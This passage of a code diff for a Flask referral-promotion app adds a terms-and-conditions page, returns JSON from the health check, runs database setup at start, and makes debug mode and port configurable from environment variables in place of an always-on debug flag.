+            color: #0077b6;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>Terms and Conditions</h1>
+
+    <p>
+        By participating in this promotion, you agree to
+        provide accurate information and use the promotion
+        only for its intended purpose.
+    </p>
+
+    <p>
+        Referral activity is tracked according to the
+        promotion's share-click system.
+    </p>
+
+    <p>
+        Reaching the displayed referral target means that
+        the participant has completed the required share
+        count. Any actual fulfilment of an offer should be
+        handled by the promotion administrator.
+    </p>
+
+    <p>
+        The promotion administrator may update or end the
+        promotion when necessary.
+    </p>
+
+    <a href="{{ url_for('home') }}">
+        Back to Promotion
+    </a>
+
+</div>
+
+</body>
+</html>
+""")
 
 
 # ============================================================
 # ADMIN LOGOUT
 # ============================================================
 
-@app.route(
-    "/secret-admin/logout"
-)
+@app.route("/secret-admin/logout")
 def admin_logout():
 
     session.clear()
@@ -2297,24 +2568,38 @@ def admin_logout():
 @app.route("/health")
 def health():
 
-    return "OK"
+    return jsonify({
+        "status": "ok"
+    })
 
 
 # ============================================================
-# START
+# START APP
 # ============================================================
+
+setup_database()
+
 
 if __name__ == "__main__":
 
+    port = int(
+        os.environ.get(
+            "PORT",
+            "5000"
+        )
+    )
+
+    debug_mode = (
+        os.environ.get(
+            "FLASK_DEBUG",
+            "0"
+        ) == "1"
+    )
+
     app.run(
         host="0.0.0.0",
-        port=int(
-            os.environ.get(
-                "PORT",
-                5000
-            )
-        ),
-        debug=True
+        port=port,
+        debug=debug_mode
     )
 
  
